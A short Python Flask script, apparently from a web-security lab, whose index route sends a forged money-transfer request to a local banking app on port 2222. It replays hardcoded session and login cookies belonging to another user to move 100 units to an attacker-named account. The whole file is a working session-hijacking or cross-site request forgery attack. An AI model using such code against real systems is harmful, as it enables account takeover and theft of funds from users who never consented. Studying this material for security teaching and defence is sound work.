import requests
from flask import Flask, render_template, redirect, request

app = Flask(__name__)

@app.route("/")
def index():
    payload = {
    "username": "AStaceyann16", 
    "moneyAmount": "100", 
    "transfer": "submit"
    }

    cookies = {"session": "eyJjc3JmX3Rva2VuIjoiMGU4NzcxZGEyYjE5YmMyZThkOTdhMWZhMmU0MjRiMGM4ZTA3ZmEzMCJ9.ZWSmfQ.rZ5Efo2VCzWgyamJhAaBkQBnmIo",
           "LOGIN_INFO": "68a5323eae69323b6d86814c471bbc83d9e3d59283dca01259ae0e7908c25d09",
           "USER": "BJenniger16"}

    r = requests.post("http://localhost:2222/loggedIn", data = payload, cookies = cookies)

    return render_template('index.html')